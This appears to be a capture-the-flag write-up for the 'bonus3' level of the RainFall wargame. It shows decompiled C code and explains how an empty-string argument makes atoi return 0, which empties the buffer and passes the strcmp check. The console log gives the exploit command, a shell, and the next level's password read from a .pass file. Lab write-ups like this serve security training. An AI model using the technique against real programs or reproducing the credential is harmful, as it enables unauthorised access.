## bonus3

```c
int main(int argc, const char** argv) {
    char buf[132];
    FILE* file = fopen("/home/user/end/.pass", "r");
    memset(buf, 0, sizeof(buf));
    if (!file || argc != 2) return -1;

    fread(buf, 1, 66, file);
    buf[65] = 0;
    buf[atoi(argv[1])] = 0;
    fread(&buf[66], 1, 65, file);
    fclose(file);
    if (!strcmp(buf, argv[1]))
        execl("/bin/sh", "sh", 0);
    else
        puts(&buf[66]);
    return 0;
}
```

Because `atoi("")` returns 0, the program sets `buf[0] = 0`, effectively forcing the first half of the buffer to become an empty string. Since `strcmp(buf, argv[1])` then compares `""` to `""`, the check succeeds, dropping us straight into the shell.

```console
bonus3@RainFall:~$ ./bonus3 ''
$ cat /home/user/end/.pass
3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
```
